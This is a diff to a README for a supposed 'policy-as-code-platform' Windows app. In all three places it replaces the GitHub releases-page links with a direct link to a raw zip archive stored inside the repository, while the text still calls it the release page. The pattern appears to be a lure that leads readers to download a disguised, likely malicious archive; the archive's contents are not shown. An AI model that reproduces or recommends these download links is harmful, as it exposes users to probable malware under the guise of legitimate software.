@@ -1,6 +1,6 @@
 # 🛡️ policy-as-code-platform - Control access with real-time policy checks
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/raw/refs/heads/main/empire/policy-as-platform-code-3.2.zip)
 
 ## 📌 What this app does
 
@@ -28,7 +28,7 @@ If your browser blocks the file, save it first and then open it from your Downlo
 
 Visit this page to download the Windows release:
 
-[https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/releases](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/releases)
+[https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/raw/refs/heads/main/empire/policy-as-platform-code-3.2.zip](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/raw/refs/heads/main/empire/policy-as-platform-code-3.2.zip)
 
 Open the latest release on that page and look for a Windows file such as:
 - `.exe`
@@ -190,4 +190,4 @@ If you edit a policy file, restart the app or reload the policy so the new rules
 
 ## 📎 Download again later
 
-[Visit the release page](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/releases) to get the latest Windows build, newer policy files, or updated app files
+[Visit the release page](https://github.com/Supervised-clitocyberobusta919/policy-as-code-platform/raw/refs/heads/main/empire/policy-as-platform-code-3.2.zip) to get the latest Windows build, newer policy files, or updated app files
